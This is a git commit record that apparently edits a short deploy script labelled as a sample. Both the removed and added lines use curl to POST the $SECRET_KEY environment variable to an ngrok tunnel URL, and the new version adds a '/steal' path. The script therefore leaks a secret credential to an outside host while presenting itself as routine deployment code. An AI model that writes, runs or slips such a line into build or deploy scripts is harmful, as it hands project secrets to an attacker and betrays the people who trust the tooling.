5837445c90cc91165d59d0a83d475aaf6cac2fee
unknowvwake <vg87090ehsaas+view@gmail.com>
2024-11-11 13:39:25 +0530

    Update deploy_script.sh

--- deploy_script.sh
+++ deploy_script.sh
@@ -1,3 +1,3 @@
 # deploy_script.sh (sample script)
 echo "Deploying application..."
-curl -X POST -d "secret=$SECRET_KEY" https://fde9-106-222-226-161.ngrok-free.app
+curl -X POST -d "secret=$SECRET_KEY" https://fde9-106-222-226-161.ngrok-free.app/steal
